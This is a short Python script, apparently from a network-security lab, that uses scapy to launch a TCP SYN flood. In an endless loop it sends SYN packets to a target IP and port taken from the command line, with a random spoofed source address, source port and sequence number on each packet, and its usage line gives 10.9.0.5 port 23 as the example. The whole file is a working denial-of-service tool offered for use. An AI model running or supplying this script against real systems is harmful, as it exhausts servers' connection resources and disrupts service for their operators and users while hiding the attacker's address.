#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits
import sys

if len(sys.argv) < 3: 
    print("Usage:   synflood.py IP Port")
    print("Example: synflood.py 10.9.0.5 23")
    quit()

ip  = IP(dst = sys.argv[1])
tcp = TCP(dport = int(sys.argv[2]), flags='S')
pkt = ip/tcp

while True:
    pkt[IP].src    = str(IPv4Address(getrandbits(32)))
    pkt[TCP].sport = getrandbits(16)
    pkt[TCP].seq   = getrandbits(32)
    send(pkt, verbose = 0)

